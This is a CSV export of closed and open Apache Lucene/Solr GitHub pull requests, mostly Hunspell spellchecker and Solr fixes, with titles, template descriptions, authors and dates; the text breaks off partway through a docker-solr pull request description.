"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","2640","SOLR-15974: Remove Calcite's ENUMERABLE_AGGREGATE_RULE as Solr only s…","…upports push-down for LogicalAggregate backport of https://github.com/apache/solr/pull/628","closed","","thelabdude","2022-02-12T17:25:30Z","2022-02-12T18:57:00Z"
"","2111","SOLR-8673 Enable custom aggregate functions by opening up FacetContex…","…t field access.    * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Enable custom aggregate functions by opening up FacetContext field access.  # Solution  Prior to this change, it was not feasible to write a custom aggregate function in plugin code because the FacetContext class did not expose its fields for access outside its package. Also some of the useful abstract classes for SlotAcc were package-private too  # Tests  Includes a (suggested) unit test to confirm that a subclass of AggValueSource can be written outside of the org.apache.solr.search.facet package.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","timatbw","2020-12-01T11:26:35Z","2020-12-07T06:45:10Z"
"","2347","LUCENE-9760: Hunspell: print total memory usage in TestAllDictionarie…","…s, cleanup   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We'd like Hunspell dictionaries not to take too much memory, especially when there's many of them loaded  # Solution  Print the memory usage of all known dictionaries together  # Tests  A test-only change  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-10T16:43:16Z","2021-02-11T08:29:02Z"
"","1997","SOLR-14940: Add ability to remove SolrCore.closeHooks. Keep reference…","…s to CloseHooks in ReplicationHandler and remove them on ReplicationHandler.shutdown()   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","anverus","2020-10-16T18:16:34Z","2020-10-27T21:45:28Z"
"","2370","LUCENE-9772: Hunspell: CHECKCOMPOUNDCASE shouldn't prohibit dash-sepa…","…rated uppercase compounds   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Dutch words like `kandidaat-Kamerlid` weren't allowed  # Solution  Replicate Hunspell's logic of allowing mixed compound case if another char on the border is dash  # Tests  Added to `checkcompoundcase`   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T13:20:18Z","2021-02-15T19:27:33Z"
"","1927","SOLR-12987: Deprecated plugins are logged once and with log category …","…org.apache.solr.DEPRECATED  https://issues.apache.org/jira/browse/SOLR-12987","closed","","dsmiley","2020-09-28T21:22:44Z","2020-10-01T12:32:24Z"
"","2375","LUCENE-9775: Hunspell: make FORCEUCASE work when the first compound w…","…ord is inherently title-case   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Now it wouldn't work for Dutch `Jupiter`+`straat`=`Jupiterstraat`  # Solution  When the case is non-varied, check the first letter of the whole compound. Make sure the `CharsRef` still holds it.  # Tests  `forceucase` expanded  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T19:50:27Z","2021-02-17T09:00:54Z"
"","2286","LUCENE-9720: Hunspell: more ways to vary misspelled word variations f…","…or suggestions   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Work on Hunspell suggestions in progress.  # Solution  Reimplement most of Hunspell's `suggest` logic, without ngrams so far.  # Tests  Several tests from Hunspell repo.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-01T19:05:02Z","2021-02-03T17:29:14Z"
"","2335","LUCENE-9753: Hunspell: disallow compounds with parts present in dicti…","…onary, space-separated   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Don't accept `compoundword` when there's `compound word` in the dictionary  # Solution  Like Hunspell, handle this near CHECKCOMPOUNDREP pattern check  # Tests  `wordpair` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-09T13:30:10Z","2021-02-10T08:28:41Z"
"","2330","LUCENE-9748: Hunspell: suggest inflected dictionary entries similar t…","…o the misspelled word   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  A follow up of the ""ngram"" suggestion support that adds single prefixes and suffixes to dictionary entries to get better suggestions  # Solution  Copy Hunspell's logic, extract some common code for FST traversal  # Tests  `allcaps.sug` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-09T08:18:31Z","2021-02-10T08:29:07Z"
"","2314","LUCENE-9736: Hunspell: support MAP-based suggestions for groups of si…","…milar letters   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell has MAP directive that allows to specify groups of similar characters/substrings to be considered for replacement  # Solution  Replicate Hunspell's logic: try replacing all occurrences of everything in MAP groups with other members of the same groups  # Tests  `map` from Hunspell repo  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-07T13:25:02Z","2021-02-08T10:13:51Z"
"","2278","SOLR-15124: Remove node/container level admin handlers from ImplicitP…","…lugins.json   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2021-02-01T10:56:01Z","2021-06-22T08:55:14Z"
"","2048","SOLR-14969: Prevent creating multiple cores with the same name which …","…leads to instabilities (race condition)  Running check now, what do people think about the approach? Running tests now, barring objections I'll push tomorrow sometime (Friday)...","closed","","ErickErickson","2020-10-30T01:05:55Z","2020-10-30T03:21:25Z"
"","2363","LUCENE-9766: Hunspell: add API for retrieving dictionary morphologica…","…l data and stemming   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  We need to rank suggestions based on metadata associated with corresponding dictionary entries. For that, we need a stemming API (to get the entries) and an API to get the morphological data (where we'd store the needed info)  # Solution  Add public `Hunspell.getRoots` and `Dictionary.lookupEntries`  # Tests  Yes, a test for each new introduced method  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-12T16:21:58Z","2021-02-15T19:48:36Z"
"","2308","LUCENE-9734: Hunspell: support suggestions based on ""ph"" morphologica…","…l data   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  `ph:` data is used for suggestions in Hunspell, we need that, too  # Solution  Convert `ph:` data to `REP`  # Tests  `ph` and `ph2` from Hunspell repository, plus enable accidentally disabled `rep` test (and fix it by committing `rep.aff` in the correct encoding)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-05T09:19:00Z","2021-02-06T17:07:46Z"
"","2244","SOLR-15099 Add null checks to IndexSizeTrigger","…its are enqueued   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Want to avoid noisy NPE on core info variables since we already log.warn on line 330.  # Solution  Minor fix: add null checks on the core info variables, as we've seen on ZK restarts that these are unavailable.   # Tests  Ran IndexSizeTrigger test locally and it succeeded. Didn't add tests for this.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","megancarey","2021-01-26T00:33:11Z","2021-01-26T00:33:11Z"
"","2216","SOLR-15085 Prevent EmbeddedSolrServer calling shutdown on a CoreConta…","…iner that was passed to it   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Prevent EmbeddedSolrServer calling shutdown on a CoreContainer that was passed to it.  # Solution  Now keeping track of whether the CoreContainer was provided or created internally and only calling shutdown for internally-created instances.  # Tests  Modified appropriate test to confirm behaviour, and removed overrides used in existing tests to workaround this issue.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","timatbw","2021-01-18T12:50:06Z","2021-01-29T17:16:57Z"
"","2079","SOLR-14998 Update log level to DEBUG for ClusterStatus in Collections…","…Handler   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Please provide a short description of the changes you're making with this pull request.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","NazerkeBS","2020-11-13T17:45:25Z","2020-11-16T21:59:32Z"
"","1893","LUCENE-9444 Utility class to get facet labels from taxonomy for a fac…","…et field. This is useful if a facet field is requested in the list of return fields for each hit.   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  This pull request adds a convenience class that allows an application to get facet labels for a facet field without knowing the internals of faceting implementation.  # Solution  Simple class with APIs to get facet labels for a facet field and (optionally) a facet dimension  # Tests  Tests were added to demonstrate expected API usage and ensure correctness of implementation  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","goankur","2020-09-19T01:31:15Z","2020-09-28T14:55:38Z"
"","2636","SOLR-15892: Adding Randomization in selecting shard leaders for delete and commit requests for RoutedAlias","…e and commit requests for RoutedAlias","open","","akkig","2022-01-04T20:16:17Z","2022-01-04T20:16:17Z"
"","2309","SOLR-14301: Remove external commons-codec usage in gradle validateJarChecksums","…Checksums   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Right now gradle calculates SHA-1 checksums using an external commons-codec library. We can calculate SHA-1 using Java 8 classes, no need for commons-codec here.  # Solution  Eliminate commons-codec usage in checksum validation.  # Tests  ./gradlew validateJarChecksums  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","asalamon74","2021-02-05T11:12:21Z","2021-02-13T12:44:58Z"
"","2385","SOLR-15135: Use DocCollection to generate state.json format expected …","…by UI to work with perReplicaState collections (backport to 8_8)   See: https://github.com/apache/lucene-solr/pull/2384","closed","","thelabdude","2021-02-16T21:29:47Z","2021-02-16T21:40:17Z"
"","1808","LUCENE-9492: Fix beasting to accept also task names in form "":project…","…:beast""; fix bug with default value rejected by Integer.parseInt","closed","","uschindler","2020-08-31T15:54:47Z","2020-08-31T18:21:53Z"
"","2305","LUCENE-9733: Hunspell: exception when loading dictionaries with mixed…","…-case words and aliased flags   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Alias treatment expects the flag string to be a single number, but HIDDEN flag is prepended to that string according to the flag format.  # Solution  Serialize the HIDDEN flag always as is, and when reading, consume it manually right after FLAG_SEPARATOR.  # Tests  Expanded `compressed.aff/dic`, added stemming checks. Removed now obsolete test for format-dependent flag serialization, as it's no longer needed.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-04T17:10:12Z","2021-02-05T08:56:04Z"
"","2354","LUCENE-9765: Hunspell: rename SpellChecker to Hunspell, fix test name…","…, update javadoc and CHANGES.txt   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The class names are imperfect and the docs are outdated  # Solution  Fix that  # Tests  No behavior change.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-11T17:30:37Z","2021-02-12T16:27:14Z"
"","2348","LUCENE-9761: Hunspell: check that FLAG and SET don't occur too far in…","… the file, cleanup   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  The parser expects SET and FLAG to occur in the first 30KB of the file, let's have an assertion for that  # Solution  Fail if encountering directives that contradict previously seen ones.  # Tests  None  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-10T16:46:07Z","2021-02-11T08:28:50Z"
"","2295","LUCENE-9726: Hunspell: speed up spellchecking by stopping at a single…","… found stem   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  `Stemmer.doStem` enumerates all possibilities, while in the spellchecker we only care if there are any roots found.  # Solution  Introduce a `RootProcessor` interface returning a boolean indicating whether to continue the search.  # Tests  No new functionality, no tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-03T09:19:04Z","2021-02-05T08:55:22Z"
"","2369","LUCENE-9771: Hunspell: don't lookup word roots unnecessarily to check…","… flags   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Hunspell performs unnecessary root lookups from the times before `Root` class was introduced  # Solution  Cleanup and shorten code by using `Root.entryId` instead of guessing flags by `lookupWord`  # Tests  None, just a cleanup.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-15T10:10:52Z","2021-02-15T19:27:45Z"
"","2283","LUCENE-9719: Resource files aren't deleted from build directory after…","… being deleted in source   * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  e.g. *.sug files used in Hunspell  # Solution  Make Gradle `Sync` them instead of `Copy`  # Tests  No  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","donnerpeter","2021-02-01T17:02:14Z","2021-02-05T08:54:43Z"
"","2206","BlobDirectoryFactory correctly deletes directories in the blob store","… and reuses BlobStore and BlobPusher.","open","","bruno-roustant","2021-01-15T09:47:59Z","2021-01-15T14:01:21Z"
"","1854","SOLR-14417: Gradle build sometimes fails RE BlockPoolSlice","Workaround. This is test-change only, shouldn't affect anything else.","closed","","dweiss","2020-09-10T14:19:42Z","2020-09-10T20:25:34Z"
"","1872","LUCENE-9510: Don't pull a merge instance when flushing stored fields out-of-order.","With recent changes to stored fields that split blocks into several sub blocks, the merge instance has become much slower at random access since it would decompress all sub blocks when accessing a document. Since stored fields likely get accessed in random order at flush time when index sorting is enabled, it's better not to use the merge instance.  On a synthetic benchmark that has one stored field and one numeric doc-value field that is used for sorting and fed with random values, this made indexing more than 4x faster.","closed","","jpountz","2020-09-14T15:17:59Z","2020-09-14T16:07:09Z"
"","1823","SOLR-14510: Remove deprecations added with BlockMax WAND support","With BMW support, we added a new method to Text response writers to include in the response if the numFound is exact or not. This PR is to remove the previously existing and deprecated methods and makes the new method abstract to force it's implementation in subclasses. This is intended for master branch only.","closed","","tflobbe","2020-09-03T01:01:20Z","2020-09-10T17:33:15Z"
"","1769","SOLR-14789: Absorb the docker-solr repo.","WIP - https://issues.apache.org/jira/browse/SOLR-14789  **This is intended for 9.0 only, and will not be backported to 8.x.**   We can continue using the docker-solr repo for all 8.x.y releases.  ### Goals  The goal of this PR is to move all functionality for how current solr images are built to lucene solr. However there are clearly a lot of other things we want to accomplish too:  - Migrate functionality from the `solr/docker/include/scripts` into `solr/bin` or Solr itself - Support the ""official"" docker releases (https://hub.docker.com/_/solr not just https://hub.docker.com/apache/solr) - Make the solr docker file more ""cloud native""  Since this docker image will not be officially used until 9.0 at the earliest, this gives us time to iterate and accomplish all of these goals. However merging in this initial functionality that works like the current docker-solr setup first lets us more easily make and test these changes.  ### Setup of `/solr/docker`  `gradle assemble` will now create a docker image that has been created with contents of `:solr:packaging`.  The ""Solr image"" is broken up into 2 docker files.  1. The `package` dockerfile, which contains the solr release under 